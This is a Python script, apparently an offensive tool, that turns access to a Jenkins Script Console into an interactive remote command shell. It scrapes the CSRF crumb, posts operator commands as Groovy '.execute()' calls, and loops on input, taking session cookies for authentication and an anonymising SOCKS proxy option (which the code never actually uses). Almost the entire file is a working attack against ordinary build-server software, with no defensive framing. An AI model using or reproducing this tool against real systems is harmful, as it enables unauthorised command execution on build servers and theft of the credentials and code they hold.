"""
Turns a Jenkins instance into a reverse shell.
Author: vxuv
Date: 2022-12-08
"""
import asyncio
import argparse
import json
import httpx

from urllib.parse import urlparse
from bs4 import BeautifulSoup

def parse_resp(html: str) -> str:
    """Parses the /script response from the Jenkins server."""
    soup = BeautifulSoup(html, "html.parser")
    result = soup.find("h2", text="Result").find_next_sibling("pre").text
    return result.replace('Result: ', '').replace('\n\n', '')

def parse_cookies(cookies: str) -> dict:
    """Turns our cookies into a dict

    Args:
        cookies (str): Cookies to parse

    Returns:
        dict: Parsed cookies
    """
    cookies = cookies.split("; ")
    cookies = [cookie.split("=") for cookie in cookies]
    cookies = {cookie[0]: cookie[1] for cookie in cookies}
    return cookies

async def execute_command(client: httpx.AsyncClient, url: str, command: str) -> str:
    """Executes a command on the Jenkins server.

    Args:
        client (httpx.AsyncClient): Client to use for requests.
        url (str): URL to /script.
        command (str): Command to execute.

    Returns:
        str: Response from the server.
    """
    resp = await client.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    crumb = soup.find("head", {"data-crumb-header": "Jenkins-Crumb"})["data-crumb-value"]
    formatted_command = command.replace('"', '\\"')
    resp = await client.post(
        url,
        data={
            "script": f'"{formatted_command}".execute().text',
            "Jenkins-Crumb": crumb,
            "json": json.dumps(
                {
                    'script':  f'"{formatted_command}".execute().text',
                    'Jenkins-Crumb': crumb

                }),
            "Submit": "Run"
        }
    )
    return resp.text

async def is_shellable(client: httpx.AsyncClient, url) -> bool:
    """
    Checks if the Jenkins instance is shellable.
    //TODO: Add a more reliable check
    Args:
        client (httpx.AsyncClient): Client to use for requests.
        url (str): URL to Jenkins instance.
    Returns:
        bool: True if shellable, False otherwise.
    """
    resp = await client.get(url)
    if ' Script Console' in resp.text:
        return True
    return False

async def shell(url: str, cookies: str, proxy: str):
    """Gets a shell on the Jenkins server.

    Args:
        url (str): URL to Jenkins instance.
        cookies (str): Client session cookies, required for authentication.
        proxy (str): Proxy to use for requests.
    """
    host = urlparse(url)
    parsed_url = f"{host.scheme}://{host.netloc}/script"
    if cookies is not None:
        cookies = parse_cookies(cookies)
    async with httpx.AsyncClient(cookies=cookies) as client:
        if not await is_shellable(client, url):
            print("[-] Shell not available.")
            return
        while True:
            command = input("> ")
            if command == "exit":
                break
            result = await execute_command(client, parsed_url, command)
            print(parse_resp(result))

async def main():
    """Main function. Parses arguments and attempts to get shell.
    python3 --url target.com --cookies "JSESSIONID=1234; " --proxy "socks5://127.0.0.1:9050"
    """
    args = argparse.ArgumentParser()
    args.add_argument("--url", help="Jenkins instance to achieve shell.", required=True)
    args.add_argument("--cookies", help="Client session cookies, required for authentication.", required=False, default=None)
    args.add_argument("--proxy", help="Proxy to use for requests.", required=False, default=None)
    args = args.parse_args()
    await shell(args.url, args.cookies, args.proxy)
    

if __name__ == "__main__":
    asyncio.run(main())